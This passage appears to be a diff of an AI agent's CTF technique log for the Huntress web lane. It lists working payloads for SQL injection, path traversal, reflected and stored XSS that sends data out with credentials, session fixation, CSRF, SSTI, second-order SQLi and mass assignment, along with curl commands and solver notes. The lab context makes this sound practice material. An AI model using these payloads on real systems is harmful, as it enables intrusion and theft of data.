exposure (D01)**: robots `Disallow: /snapshots-<hex>/` | `/deploy-<hex5>/`; file","-  `environment-copy-<hex>.json.bak` | `site-config-<hex6>.json.bak` (+ decoy `release-notes.txt`). Rule: depth-2","-  same-origin crawl from robots/sitemap/comments, regex `proof_` in bodies and zip members.","-- **IDOR (D02)**: foreign ids in `/api/history`; API template from the page's `fetch()`. Rule: request foreign ids.","-- **SQLi (D03)**: `/lookup?q=` wrapped in `('%..%')`. Rule: tautologies covering `'` `')` `'))` `\"` + `--`/`#`.","-- **LFI (D04)**: `reader.php?doc=<page>`, prompt-named `/run/huntress/objective.txt`. Rule: every param with `.`/`/`","-  in its value x `../`*10+path, absolute, `....//`, `..%2f`, `php://filter`, `<orig dir>/`+`../`*10.","-- **Access control (D05)**: GET (then POST) every `/...` value in the clue JSON.","-- **CSRF (D09)**: route hex, the outside mailbox in the `<select name=destination>` (`review-NNNN@outside.","-  example.invalid`; the current value is `daily`), and whether the hidden `csrf_token` (= `arena_session` value) is","-  sent -- both worked. Rule: parse every `<form>` on the clue-named page (action, method, selects, hiddens), choose","-  the non-current external option, submit as a cross-site navigation with token / without / swapped method.","-- **Upload (D10)**: route words + app skin; policy text \"txt + text/plain\" never enforced (single, TT, Mastery).","-  Rule: routes by key (`feature*` upload, `render*` preview), preview URL from the upload response's `path`, template","-  syntax from the guide's `<code>` example, field name `objective`.","-- **Proof carrier**: HTML text, JSON `support_note` | `note` | `evidence`, a receipt shown on a board page. Rule:","-  regex `proof_[0-9a-f]{32}` over every body -- don't key on field names.","+  `inspect`; secondary `callback` | `internal` | `status` | `result` | `audit` | `staff-<hex8>`; render (D10)","+  `account` | `internal` | `result`; D09 `preferences_route` fixed `/preferences`. Seen within one day: D12 secondary","+  `result` (single) -> `internal` (TT); D13 `audit` -> `internal`. Rule: pick routes by clue KEY role","+  (`feature_route`, `secondary_route`, `*_data_route`, `*_template`), never by the word in the value.","+- **Clue key set**: with a concept key (D06-D10) | only `feature_route`+`secondary_route` (D12, D13) | only","+  `feature_route` (D05, D11). Rule: no concept key -> classify from the prompt + bare GET of each route (`post_required`","+  = a POST sink; 403 `administrator_required` = privilege check; HTML `<pre>` echo = render sink).","+- **Request body encoding (D12, D13)**: POST-only routes accept form AND JSON with `{\"ok\":true,\"saved\":true}` /","+  `201 {\"ok\":true,\"profile\":{...}}`, but only the JSON body is bound (D12 form plant -> `rows: []`). Rule: send","+  JSON first (form second), every candidate field in one body.","+- **Backup exposure (D01)**: robots `Disallow: /snapshots-<hex>/` | `/deploy-<hex5>/`; file `environment-copy-<hex>","+  .json.bak` | `site-config-<hex6>.json.bak` (+ decoy `release-notes.txt`). Rule: depth-2 crawl, regex `proof_`.","+- **IDOR (D02)** foreign ids in `/api/history`. **SQLi (D03)** `('%..%')` wrapper -> tautologies over `'` `')` `'))`","+  `\"` + `--`/`#` (and quote-balanced, see cross-check). **LFI (D04)** every param whose value has `.`/`/` x `../`*10 +","+  prompt path, absolute, `....//`, `..%2f`, `php://filter`. **Access control (D05)** GET then POST every clue route.","+- **Board noun (D07)**: `/api/messages`+`/messages/{id}` | `/api/postcards`+`/postcards/{id}` -> from openapi/submit `url`.","+- **CSRF (D09)**: route hex, outside mailbox option (`review-NNNN@outside.example.invalid`), token sent or not (both","+  worked). Rule: parse every `<form>` on the clue page; submit the non-current external option cross-site.","+- **Upload (D10)**: route words + skin; \"txt + text/plain\" policy never enforced. Rule: routes by key, preview URL from","+  the upload response's `path`, template syntax from the guide's `<code>`, field `objective`.","+- **SSTI (D11)**: feature `/process-<hex6>`, param `template` (`message`, `q`, `name`, `text`, `input` rendered empty),","+  delimiter `{{..}}` evaluated while `${..}` / `*{..}` came back literal under a \"Spring Boot\" costume; context var","+  `objective`; other names -> Spring-style 500 JSON. TT + Mastery passed with the same handler. Rule: per candidate","+  param send one probe holding every delimiter family with distinct arithmetic (`{{49*1}}|${50*1}|...`), keep the","+  family whose number appears evaluated, then ask it for `objective` (then `proof`, `flag`).","+- **Second-order SQLi (D12)**: winning plant `x' OR '1'='1' -- ` (single) and `zz' OR 1=1 --` (TT), both JSON, every","+  common field at once (`name,q,query,note,label,title,value,filter,search,term,report,...`). Rule: plant the ladder","+  (quote-balanced, paren, `--`-terminated) as JSON then form, re-GET `secondary_route` after EACH plant.","+- **Mass assignment (D13)**: NestJS costume, echo only `display_name`; single and TT both passed with one JSON body","+  holding `display_name` + `role:\"admin\"|\"administrator\"`, `is_admin`, `isAdmin`, `admin`, `roles:[\"admin\"]`,","+  `access_level`, `permissions` (which key bound is unknown -- the echo hides it). State is server-side per target,","+  no cookie. Rule: bind the whole privilege set in one POST, then GET `secondary_route`.","+- **Proof carrier**: HTML text / `<pre>`, JSON `support_note` | `note` | `evidence` | `rows[]`, a receipt on a board","+  page. Rule: regex `proof_[0-9a-f]{32}` over every body -- never key on field names or on `effect`."," "," ## Recognition cues -> first move"," - `targets[]` -> `curl --max-time 20 -sS -A 'Mozilla/5.0' -i <url>` (hook blocks curl without `--max-time`;","   Cloudflare 403'd urllib's default UA), then `/robots.txt`, `/api/clues`, `/openapi.json`, `/sitemap.xml`.","-- Read /api/clues FIRST and call each route bare: the JSON error names the missing piece (param, cookie, login, browser).","-- `Disallow:` / \"crawler policy\" comment -> D01 crawl. \"Signed in as\" + `/<things>/<id>` -> D02 IDOR.","-- Search form / \"database\" -> D03 tautology. `?doc=` + \"stay inside / mounted at /path\" -> D04 traversal.","-- \"staff-only door, just a sign\", `feature_route` -> D05 GET it.","-- \"repeats everything you tell it\", \"talks back\", `callback_nonce` -> D06: reflect `<script>fetch('<cb>?nonce=N')","-  </script>` via `?q=` on the feature route, then GET the callback yourself with browser headers.","-- \"guestbook\", \"reviewer stops by\", \"good things come to those who wait\", `moderator_data_route` -> D07: store a","-  script that fetches the data route and POSTs it to the receipt route; poll the entry page.","-- \"plant your session\", \"welcome mat\", \"somebody else's credentials\", `session_hint` -> D08 session fixation.","-- \"obeys whoever asks nicely -- even strangers\", \"forge one request\", `preferences_route`, a form with hidden","-  `csrf_token` -> D09 CSRF: submit the form's state change with `Sec-Fetch-Site: cross-site`, `Sec-Fetch-Mode:","-  navigate`, `Sec-Fetch-Dest: document`, foreign `Referer`; read `/api/preferences`.","-- \"upload form has standards. Low ones\", \"served from somewhere it was never meant to live\", `upload_shape`,","-  `render_route`, `preview_guide` -> D10: upload `.html` with `{{objective}}`, open the preview path.","-- JSON with `evidence` = landed; `evidence` is the answer.","+- Read /api/clues FIRST and call each route bare: the JSON error names the missing piece (param, cookie, login,","+  browser, POST, admin). No concept key -> the prompt's verb names the bug.","+- `Disallow:` -> D01 crawl. \"Signed in as\" + `/<things>/<id>` -> D02 IDOR. Search / \"database\" -> D03 tautology.","+  `?doc=` + \"stay inside / mounted at /path\" -> D04 traversal. \"staff-only door, just a sign\" -> D05 GET it.","+- \"repeats everything\", `callback_nonce` -> D06 reflect `<script>fetch('<cb>?nonce=N')</script>` via `?q=`, then GET","+  the callback with same-origin fetch-metadata. \"guestbook\", \"reviewer stops by\", `moderator_data_route` -> D07 stored","+  script fetch(data)->POST receipt; poll. \"plant your session\", `session_hint` -> D08 `?sid=<hint>`.","+- \"obeys whoever asks nicely -- even strangers\", form with hidden `csrf_token` -> D09 cross-site form submit.","+- \"upload form has standards. Low ones\", `upload_shape`/`render_route` -> D10 upload `.html` with `{{objective}}`.","+- \"template engine ... evaluates everything\", \"speak in expressions\", \"incantation\", page \"Rendered message\" with an","+  empty `<pre>` -> D11 SSTI: `GET <feature>?template={{7*7}}` (49), then `?template={{objective}}`.","+- \"plant your question inside the data and come back later\", \"delayed echo\", feature = `post_required`, secondary","+  returns `{\"rows\":[],\"effect\":...}` -> D12 second-order SQLi: POST JSON every field = `x' OR '1'='1' -- `, GET","+  secondary -> `rows` holds the private row.","+- \"the form only asked for your name. But the API binds whatever you hand it\", \"hand it a promotion\", feature","+  `post_required` + secondary 403 `administrator_required` -> D13 mass assignment: POST JSON `display_name` + every","+  privilege key, GET secondary -> `effect: bound_privileged_property` + `evidence`.","+- Proof regex hit = landed; an `effect` alone is NOT (D12 prints its effect with empty rows)."," "," ## Day by day","-- **D01-D05 (cal. 19-20)**, compressed: D01 robots Disallow -> index -> `.json.bak` `support_note` (Mastery D04 missed","-  it: crawl only one level deep). D02 `/api/history` foreign id -> `GET /api/briefs/<id>`. D03 `/lookup?q=zz') OR 1=1","-  --` (plain `' OR '1'='1` failed: paren-wrapped). D04 `reader.php?doc=../`*6+`run/huntress/objective.txt` (absolute","-  and `....//` failed); single 51 s. D05 `/api/clues` -> GET `/dispatch-<hex6>` -> `effect:","-  framework_authorization_bypassed`; single 47 s, Mastery 340 s (321 s preparing).","-- **D06 Reflect Upon This (cal. 21)** -- reflected XSS, server-judged. GET `<feature>?q=<script>fetch('<cb>?nonce=N')","-  </script>`, then GET `<secondary>?nonce=N` with `Sec-Fetch-Site: same-origin`, `-Mode: cors`, `-Dest: empty`,","-  `Referer: <reflected URL>`, `Origin`, `X-Callback-Nonce: N` -> `effect: isolated_browser_callback`. 83 s. TT broke","-  on choosing the callback by the word `callback` (TT's was `/internal-<hex6>`) -> pick by key `secondary_route`.","-- **D07 Stored for Later (cal. 21)** -- stored XSS, real moderator bot. POST `{\"message\":\"<script>..fetch(DATA,","-  {credentials:'include'}) .. POST {evidence:t} to RCPT(id from location.pathname)</script>\",\"name\":\"guest\"}` to","-  `/api/messages`; poll `/messages/{id}`. 78 s. Mastery: `/api/postcards` variant (derive view from openapi/submit","-  `url`), receipt landed after 12 s, solver mutual recursion, submit 503 that had landed (`already_solved` on retry).","-- **D08 Session Impression (cal. 21)** -- session fixation. `GET /action-<hex6>?sid=<session_hint>` (`?session=`,","-  `?session_id=`, JSON, `X-Session-Id`, cookies all failed) -> `Set-Cookie: arena_session=<hint>`; `GET","-  /status-<hex6>` with that cookie -> `effect: fixed_session_privilege_transfer`. 116 s. Mastery (3 targets) ~15 min:","-  racing every solver on every target starved the app -> recon-gate the probes.","-- **D09 Forged With Care (cal. 22)** -- CSRF judged server-side by fetch-metadata (no bot). Clues: `feature_route:","-  /submit-<hex6>`, `preferences_route: /preferences`. `GET /` sets `arena_session`; `/preferences` holds `<form","-  method='get' action='/submit-<hex6>'>` with `<select name=destination>` (`daily` | `review-NNNN@outside.example.","-  invalid`) + hidden `csrf_token` (= session value). Bare/same-site submit -> `changed_across_sites:false`;","-  missing cookie -> `signed_in_session_required`; bad option -> `invalid_destination`. Worked: `curl --max-time 20 -b","-  arena_session=S -H 'Sec-Fetch-Site: cross-site' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Dest: document' -H","-  'Referer: https://evil.example/' '<base>/submit-<hex6>?destination=review-NNNN%40outside.example.invalid'`, then","-  `GET /api/preferences` -> `{\"destination\":..,\"changed_across_sites\":true,\"evidence\":\"proof_..\"}`. Token optional.","-  Single CORRECT 70 s. TT `solver_incomplete` (41 s generic race, no CSRF handler; live worker hand-solved);","-  generalized `csrf()` form parser ~5 requests ~1 s. Mastery 3 targets CORRECT, solve 4.9 s.","-- **D10 Uploading Expectations (cal. 22)** -- unrestricted upload rendered by a server-side template preview. Clues:","-  `feature_route` (`/execute|action|inspect-<hex6>`), `render_route` (`/account|internal|result-<hex6>`),","-  `preview_guide` (staff HTML previews evaluate `{{field}}`; objective field `objective`), `upload_policy` (\"txt,","-  text/plain\" -- not enforced), `upload_shape: \"POST JSON: filename, content, content_type\"`. Worked: POST","-  `{\"filename\":\"note.html\",\"content\":\"<p>{{objective}}</p>\",\"content_type\":\"text/html\"}` -> `{\"path\":\"<render>?file=","-  note.html\"}` -> GET it -> proof in HTML. GET on the upload route -> `method_not_allowed`; wrong file ->","-  `file_not_found`. No code execution, no traversal needed. Single CORRECT 58 s. TT `solver_incomplete` (40.65 s","-  generic race, targets serial); generalized handler 3 requests. Mastery (D01 backup + D02 IDOR + D10) CORRECT,","-  solve 3.9 s with targets threaded.","+- **D01-D05 (cal. 19-20)**: D01 robots Disallow -> index -> `.json.bak` `support_note` (Mastery missed it with a","+  one-level crawl). D02 `/api/history` foreign id -> `GET /api/briefs/<id>`. D03 `/lookup?q=zz') OR 1=1 --` (plain","+  `' OR '1'='1` failed). D04 `reader.php?doc=../`*6+`run/huntress/objective.txt`; 51 s. D05 GET `/dispatch-<hex6>`","+  -> `effect: framework_authorization_bypassed`; 47 s.","+- **D06-D08 (cal. 21)**: D06 reflected XSS, server-judged: reflect `fetch('<cb>?nonce=N')` via `?q=`, then GET","+  `<secondary>?nonce=N` with `Sec-Fetch-Site: same-origin`/`Mode: cors`/`Dest: empty`, `Referer: <reflected URL>`,","+  `Origin`, `X-Callback-Nonce` -> `isolated_browser_callback`; 83 s; TT broke on routing by the word `callback`.","+  D07 stored XSS, real moderator bot: POST a `<script>` that fetches the data route with credentials and POSTs","+  `{evidence}` to the receipt route; poll `/messages/{id}`; 78 s; Mastery had `/api/postcards`, receipt after 12 s.","+  D08 session fixation: `GET /action-<hex6>?sid=<hint>` -> `Set-Cookie: arena_session=<hint>` -> GET secondary ->","+  `fixed_session_privilege_transfer`; 116 s; Mastery ~15 min (every solver raced on every target starved the app).","+- **D09-D10 (cal. 22)**: D09 CSRF judged by fetch-metadata: `/preferences` form (`destination` select, hidden","+  `csrf_token`); submit `?destination=review-NNNN%40outside.example.invalid` with `Sec-Fetch-Site: cross-site`,","+  `Mode: navigate`, `Dest: document`, foreign Referer -> `/api/preferences` `changed_across_sites:true` + `evidence`;","+  70 s. D10 upload: POST `{\"filename\":\"note.html\",\"content\":\"<p>{{objective}}</p>\",\"content_type\":\"text/html\"}` -> GET","+  the returned `path` -> proof in HTML; 58 s. Both TT `solver_incomplete` (~41 s generic race); Mastery 3.9-4.9 s.","+- **D11 Template Temper (cal. 23)** -- SSTI. Clues `{framework: \"Spring Boot\", current_role, feature_route:","+  /process-<hex6>}`, nothing else. Bare GET -> `<article><h1>Rendered message</h1><pre></pre></article>`. One probe","+  per param `a${7*7}b*{7*7}c{{7*7}}d`: only `template` rendered, as `a${7*7}b*{7*7}c49d`. `?template={{objective}}`","+  -> proof in `<pre>`; `{{T(java.lang.Runtime)}}` printed a class (SpEL-ish, RCE was never needed). Single CORRECT","+  105 s; the worker wrote the plugin handler before submitting -> TT CORRECT first try (15.8 s total, solve 5.2 s),","+  Mastery 3 targets 15.4 s.","+- **D12 Ask Again Later (cal. 23)** -- second-order SQLi. Clues `{framework: \"Sinatra\", feature_route: /submit-<hex6>,","+  secondary_route: /result-<hex6> | /internal-<hex6>}`. GET feature -> 405 `post_required`; any POST (form or JSON,","+  even `{}`) -> `{\"ok\":true,\"saved\":true}`; GET secondary runs the stored value in a quoted SQL literal ->","+  `{\"rows\":[...],\"effect\":\"delayed_query_revealed_private_row\"}`, effect printed even with `rows: []`. Form-encoded","+  plants in 25 field names -> `rows: []`; the same payload as JSON (`curl -X POST -H 'Content-Type:","+  application/json' -d '{\"name\":\"x'\"'\"' OR '\"'\"'1'\"'\"'='\"'\"'1'\"'\"' -- \",...}'`) -> `rows: [\"Ordinary workspace","+  note\",\"proof_...\"]`; a `\"`-quoted variant -> `rows: []`, an `x') OR 1=1 -- ` variant -> 500. TT winner `zz' OR 1=1 --`","+  (JSON). `--` comments DID work in both (the handler docstring claiming otherwise is wrong). Single CORRECT 83 s; TT","+  `solver_incomplete` 41 s (handler not yet written), live worker hand-solved; Mastery solve 6.4 s (189 s preparing).","+- **D13 Posted Too Much (cal. 23)** -- mass assignment. Clues `{framework: \"NestJS\", feature_route: /inspect-<hex6>,","+  secondary_route: /audit-<hex6> | /internal-<hex6>}`. GET feature -> 405 `post_required`; GET secondary -> 403","+  `administrator_required`. POST JSON `{\"display_name\":\"bob\",\"role\":\"admin\",\"is_admin\":true,\"admin\":true}` -> `201","+  {\"ok\":true,\"profile\":{\"display_name\":\"bob\"}}` (privileged keys silently bound, not echoed) -> GET secondary ->","+  `{\"ok\":true,\"effect\":\"bound_privileged_property\",\"evidence\":\"proof_...\"}`. Single CORRECT 59 s; TT","+  `solver_incomplete` 12.9 s (solve.py was a stub), live worker sent role/isAdmin/is_admin/admin/roles/access_level/","+  permissions in one body -> CORRECT; Mastery solve 4.6 s (175 s preparing)."," "," ## GM answer conventions learned"," - Answer = bare `proof_<32 lowercase hex>` (the CORRECT body's `flag` is a different value; never submit it). `trim`.","   Ids `proof-1`..`proof-N` in target order. Batch all Mastery proofs in one submit; partial = `accepted`+`remaining`."," - `effect` spellings confirmed: `framework_authorization_bypassed` (D05), `isolated_browser_callback` (D06),","-  `fixed_session_privilege_transfer` (D08). D09 has no `effect`: `changed_across_sites:true` + `evidence`. D10","-  prints the proof in the rendered preview HTML. D07 shows the proof in a moderator receipt on the entry page instead.","+  `fixed_session_privilege_transfer` (D08), `delayed_query_revealed_private_row` (D12, proof in `rows[]`),","+  `bound_privileged_property` (D13, proof in `evidence`). D09 `changed_across_sites:true` + `evidence`; D10, D11 proof","+  in rendered HTML; D07 in a moderator receipt."," - `already_solved` after CORRECT is harmless; a 503 `temporarily_unavailable` on submit may still have landed."," "," ## Pitfalls that cost time","-- Choosing routes by the WORD in a clue value (`callback`, `messages`) -- words are re-dealt; use clue keys / openapi.","-- Routing by prompt keywords in Mastery: earlier-day targets get today's prompt (D04 missed T1).","-- One-level crawls: the D01 proof sits one link below the Disallow index.","-- Solvers importing each other's `fallback()` -> mutual recursion -> timeout. Import `answer()` only.","+- Shipping a new day without its class handler: D09, D10, D12, D13 TT all `solver_incomplete`. Write the","+  `lib/web/handlers/dayNN_*.py` plugin (KEY_MAP + HANDLERS) BEFORE the single submit, like D11 did.","+- Treating `effect` as success: D12's reader prints its effect with `rows: []`. Success = proof regex.","+- Form-encoded bodies on JSON APIs: D12 ignored form fields (but answered `saved:true`). Send JSON first.","+- Trusting the echo: D13 echoes only `display_name`; bound privileges are invisible until the secondary route.","+- A 500 on `{{unknown}}` (D11 Spring JSON) means \"undefined variable\", not \"not injectable\"; `{{objective}}` worked.","+- Choosing routes by the WORD in a clue value -- words are re-dealt within a day (D12 result->internal, D13","+  audit->internal); use clue keys / openapi. Routing by prompt keywords in Mastery (earlier-day targets get today's","+  prompt). One-level crawls (D01 proof sits one link below the index). Solvers importing each other's `fallback()`."," - Hammering one target with every earlier probe in parallel slows the app; recon-gate the probes."," - Polling a bot-driven receipt for a fixed 12 s: the D07 moderator sometimes comes later."," - Live cases can't be replayed after CORRECT (410). Save target responses during the solve; never hard-code proofs.","-- Shipping a new day with only the generic `lib.web` race: a new class always misses it and burns ~40 s (D09, D10","-  TT). Write the class handler (keyed on the new clue key) into solve.py before TT; run Mastery targets in threads.","-- Trusting the app's stated policy (\"txt only\", \"token required\"): D09 token and D10 type rules were decorative --","-  try the forbidden form first, it is one request.","+- Trusting the app's stated policy (\"txt only\", \"token required\"): D09/D10 rules were decorative."," - `curl` without `--max-time` is blocked by the hook; urllib's default UA can draw a Cloudflare 403."," "," ## reviewer cross-check (measured on a parallel agent; folded into the drivers)","-- **Blind SQLi oracle trap.** The search interpolates `q` into an EVEN number of `col LIKE '%q%'` clauses, so the","-  classic tautology PAIR is NOT an oracle: `' OR '1'='1` and `' OR '1'='2` BOTH return all rows (the first clause","-  degenerates to `LIKE '%'`). \"Same result both ways\" is not \"not injectable.\" What works is QUOTE BALANCE:","-  `nope' OR (<cond>) OR '1'='2` makes every literal clause false and reduces the WHERE to `<cond>` (rows = TRUE,","-  0 rows = FALSE); calibrate on `1=1`/`1=2`. Backend is SQLite (`information_schema` absent); the proof is the","-  `summary` of the hidden row — `... WHERE summary LIKE char(112,114,111,111,102,37)` spells `'proof%'` without a","-  quote. Odd-quote / `--` / `#` / `;` / `%'`-breakout payloads all dead-end. (`lib/web/handlers` ladder now carries a","-  quote-balanced payload.)","-- **LFI.** The `?doc=` viewer silently returns the NORMAL page for depth 1-2 traversal; escalate to >= 3 `../` into the","-  absolute path the prompt names (measured `/run/huntress/objective.txt`). The viewer script/param name re-rolls —","-  read it off the root page's links. (`doc` + a deep huntress-objective payload added to the ladder.)","-- **`control_unavailable` is TRANSIENT, not terminal.** An `op=start` can answer `control_unavailable` after a hang","-  (measured 26.7 s on 2026-10-22); a plain `op=start` resend succeeded on try 1. Treat it as unjudged — back off and","-  re-send — never as a gate or a dead route. (`webtarget.terminal()` now classes it with `rate_limited`.)","+- **Blind SQLi oracle trap (D03).** `q` sits in an EVEN number of `col LIKE '%q%'` clauses, so `' OR '1'='1` and","+  `' OR '1'='2` BOTH return all rows. Oracle = quote balance: `nope' OR (<cond>) OR '1'='2` reduces WHERE to","+  `<cond>`; calibrate on `1=1`/`1=2`. SQLite; `summary LIKE char(112,114,111,111,102,37)` spells `'proof%'`.","+- **LFI.** The `?doc=` viewer silently returns the NORMAL page for depth 1-2; use >= 3 `../` into the prompt path.","+- **`control_unavailable` is TRANSIENT** (a 26.7 s hang on `op=start`; resend succeeded). Back off and re-send."]}],"originalFile":"# web — technique log (lane-days D01-D10 released; updated after every day)\n\nHow the lane has looked so far (observations, not guarantees):\n- **Late release, catch-up pace.** No web on calendar days 1-18. Cal. day 19 released D01-D03, day 20 D04-D05,\n  day 21 D06-D08, day 22 D09-D10 (GM ids `web-exploitation-day-NN-<slug>`; the slug is NOT always the title: D07\n  \"Stored for Later\" = `web-exploitation-day-07-stored-xss`; folder `challenges/<cal-day>/web-<title>`). Expect 2-3\n  lane-days per calendar day. Each lane-day = ONE classic bug, named by a title pun: D01 backup exposure \"Back Up a\n  Minute\", D02 IDOR \"Permission to Slip\", D03 SQLi \"Query Me This\", D04 path traversal \"Stay in Your Directory\", D05\n  missing function-level authz \"Administratively Speaking\", D06 reflected XSS \"Reflect Upon This\", D07 stored XSS\n  \"Stored for Later\", D08 session fixation \"Session Impression\", D09 CSRF \"Forged With Care\", D10 unrestricted upload\n  \"Uploading Expectations\". Arc: info-disclosure -> access control -> injection -> file read -> access control ->\n  client-side (XSS x2) -> session -> CSRF -> upload (server-side turn began at D10).\n- **No artifact: a live target.** `start` returns `result: preparing` until ready, then `targets: [{\"id\": \"Target N\",\n  \"url\": \"https://<48hex>.2026.huntress.ctf.games/\"}]`. Reachable directly from the host, behind Cloudflare. After\n  CORRECT every path returns `410 {\"state\":\"completed\"}`; an untimed target stops after 30 min idle.\n- **Contract is fixed:** `proof-N` \"Recover the proof from Target N.\", artifact `Target N`, `exact_text`, `trim`.\n  Answer = token `proof_<32 lowercase hex>` printed by the app.\n- **Since D05 every app is the same kit** (\"A small, complete training app with one deliberately isolated security\n  boundary\"; framework banner = costume: Django, Laravel/`X-Powered-By: PHP/8.3`, Node, FastAPI-style\n  `/openapi.json`). `GET /api/clues` (linked as \"Open workspace notes\") names everything: `framework`,\n  `feature_route: /<word>-<hex6>`, `secondary_route: /<word>-<hex6>`, `current_role: analyst`, plus ONE\n  concept-specific key (`session_hint`, `callback_nonce`, `moderator_data_route`, `receipt_route_template`,\n  `preferences_route` (D09), `render_route`+`preview_guide`+`upload_policy`+`upload_shape` (D10)). The concept key\n  often states the request shape in prose (`upload_shape: \"POST JSON: filename, content, content_type\"`). Routes\n  answer machine-readable JSON errors that say what is missing (`session_id_required`, `authenticated_login_required`,\n  `browser_callback_required`, `signed_in_session_required`, `invalid_destination`, `method_not_allowed`,\n  `file_not_found`). Success = `{\"ok\":true,\"effect\":\"<snake_case>\",\"evidence\":\"proof_...\"}` or a concept-shaped JSON\n  carrying `evidence` (D09 `{\"destination\":..,\"changed_across_sites\":true,\"evidence\":..}`) or the proof inline in a\n  rendered page (D10).\n- **\"Browser\" checks are of two kinds.** D06 and D09: NO real browser -- the server judges the request by\n  fetch-metadata headers + Referer (D06 same-origin \"from the reflected page\"; D09 `Sec-Fetch-Site: cross-site`\n  \"from a stranger's page\"). D07: a REAL moderator browser bot visits stored content a few seconds (sometimes >12 s)\n  later and runs your script with its cookies. Try the header-judged form first; it is one request.\n- **Mastery = today's bug + earlier lane-days on extra targets** (2 targets D03-D07, **3 since D08**); the prompt\n  describes only today's bug. Earlier bugs seen in Mastery / compounding so far: D01 (x3), D02 (x2), D04, D05. Mastery\n  targets can take ~5 min in `preparing` (singles / TT 4-10 s; D09/D10 Mastery ~6 s).\n- **A new class beats the generic seed every time.** D09 and D10 TT both came back `solver_incomplete` after ~41 s:\n  the shipped solve.py was only the `lib.web` race (session-fixation handler + earlier days' `answer()`), which has\n  no handler for the new class; the live worker solved TT by hand. The fix that held: a per-class handler keyed on the\n  clue KEY, ~3-5 requests, targets in threads -> Mastery solve 3.9-4.9 s.\n\n## Variant axes (what differs between single, Time Trial and Mastery -- parse every value listed)\n- **Target host / count**: random 48-hex host per attempt; 1 target (single, TT), 2-3 (Mastery). Rule: map question\n  `artifact` \"Target N\" to `targets[].id`, fallback Nth entry; never reuse a URL across attempts.\n- **Mastery composition / order**: earlier-day targets at any index; prompt is today's only. Rule: cheap recon on\n  every target (home, robots, /api/clues, /openapi.json), then run the concept probes the recon hints first, the rest\n  after. Earlier solvers' `answer()` ONLY -- day-21 solvers' `fallback()`s import each other (infinite recursion =\n  timeout). Running every probe at once x3 targets slowed each 2-5x: stage them.\n- **Clue route words** (`/<word>-<hex6>`): feature `dispatch` | `execute` | `process` | `action` | `submit` |\n  `inspect`; secondary `callback` | `internal` | `status` | `staff-<hex8>`; render (D10) `account` | `internal` |\n  `result`; D09 `preferences_route` was the fixed `/preferences`. Rule: pick routes by clue KEY role (`feature_route`,\n  `secondary_route`, `*_data_route`, `*_template`), never by the word in the value (D06 TT broke on `/internal-`).\n- **Resource noun on boards** (D07): `/api/messages` + `/messages/{id}` | `/api/postcards` + `/postcards/{id}`.\n  Rule: take the submit route and the `/<noun>/{id}` view from `/openapi.json` `paths` / the submit response's\n  `url`, else the home page (it lists every entry with its receipt).\n- **Backup exposure (D01)**: robots `Disallow: /snapshots-<hex>/` | `/deploy-<hex5>/`; file\n  `environment-copy-<hex>.json.bak` | `site-config-<hex6>.json.bak` (+ decoy `release-notes.txt`). Rule: depth-2\n  same-origin crawl from robots/sitemap/comments, regex `proof_` in bodies and zip members.\n- **IDOR (D02)**: foreign ids in `/api/history`; API template from the page's `fetch()`. Rule: request foreign ids.\n- **SQLi (D03)**: `/lookup?q=` wrapped in `('%..%')`. Rule: tautologies covering `'` `')` `'))` `\"` + `--`/`#`.\n- **LFI (D04)**: `reader.php?doc=<page>`, prompt-named `/run/huntress/objective.txt`. Rule: every param with `.`/`/`\n  in its value x `../`*10+path, absolute, `....//`, `..%2f`, `php://filter`, `<orig dir>/`+`../`*10.\n- **Access control (D05)**: GET (then POST) every `/...` value in the clue JSON.\n- **CSRF (D09)**: route hex, the outside mailbox in the `<select name=destination>` (`review-NNNN@outside.\n  example.invalid`; the current value is `daily`), and whether the hidden `csrf_token` (= `arena_session` value) is\n  sent -- both worked. Rule: parse every `<form>` on the clue-named page (action, method, selects, hiddens), choose\n  the non-current external option, submit as a cross-site navigation with token / without / swapped method.\n- **Upload (D10)**: route words + app skin; policy text \"txt + text/plain\" never enforced (single, TT, Mastery).\n  Rule: routes by key (`feature*` upload, `render*` preview), preview URL from the upload response's `path`, template\n  syntax from the guide's `<code>` example, field name `objective`.\n- **Proof carrier**: HTML text, JSON `support_note` | `note` | `evidence`, a receipt shown on a board page. Rule:\n  regex `proof_[0-9a-f]{32}` over every body -- don't key on field names.\n\n## Recognition cues -> first move\n- `targets[]` -> `curl --max-time 20 -sS -A 'Mozilla/5.0' -i <url>` (hook blocks curl without `--max-time`;\n  Cloudflare 403'd urllib's default UA), then `/robots.txt`, `/api/clues`, `/openapi.json`, `/sitemap.xml`.\n- Read /api/clues FIRST and call each route bare: the JSON error names the missing piece (param, cookie, login, browser).\n- `Disallow:` / \"crawler policy\" comment -> D01 crawl. \"Signed in as\" + `/<things>/<id>` -> D02 IDOR.\n- Search form / \"database\" -> D03 tautology. `?doc=` + \"stay inside / mounted at /path\" -> D04 traversal.\n- \"staff-only door, just a sign\", `feature_route` -> D05 GET it.\n- \"repeats everything you tell it\", \"talks back\", `callback_nonce` -> D06: reflect `<script>fetch('<cb>?nonce=N')\n  </script>` via `?q=` on the feature route, then GET the callback yourself with browser headers.\n- \"guestbook\", \"reviewer stops by\", \"good things come to those who wait\", `moderator_data_route` -> D07: store a\n  script that fetches the data route and POSTs it to the receipt route; poll the entry page.\n- \"plant your session\", \"welcome mat\", \"somebody else's credentials\", `session_hint` -> D08 session fixation.\n- \"obeys whoever asks nicely -- even strangers\", \"forge one request\", `preferences_route`, a form with hidden\n  `csrf_token` -> D09 CSRF: submit the form's state change with `Sec-Fetch-Site: cross-site`, `Sec-Fetch-Mode:\n  navigate`, `Sec-Fetch-Dest: document`, foreign `Referer`; read `/api/preferences`.\n- \"upload form has standards. Low ones\", \"served from somewhere it was never meant to live\", `upload_shape`,\n  `render_route`, `preview_guide` -> D10: upload `.html` with `{{objective}}`, open the preview path.\n- JSON with `evidence` = landed; `evidence` is the answer.\n\n## Day by day\n- **D01-D05 (cal. 19-20)**, compressed: D01 robots Disallow -> index -> `.json.bak` `support_note` (Mastery D04 missed\n  it: crawl only one level deep). D02 `/api/history` foreign id -> `GET /api/briefs/<id>`. D03 `/lookup?q=zz') OR 1=1\n  --` (plain `' OR '1'='1` failed: paren-wrapped). D04 `reader.php?doc=../`*6+`run/huntress/objective.txt` (absolute\n  and `....//` failed); single 51 s. D05 `/api/clues` -> GET `/dispatch-<hex6>` -> `effect:\n  framework_authorization_bypassed`; single 47 s, Mastery 340 s (321 s preparing).\n- **D06 Reflect Upon This (cal. 21)** -- reflected XSS, server-judged. GET `<feature>?q=<script>fetch('<cb>?nonce=N')\n  </script>`, then GET `<secondary>?nonce=N` with `Sec-Fetch-Site: same-origin`, `-Mode: 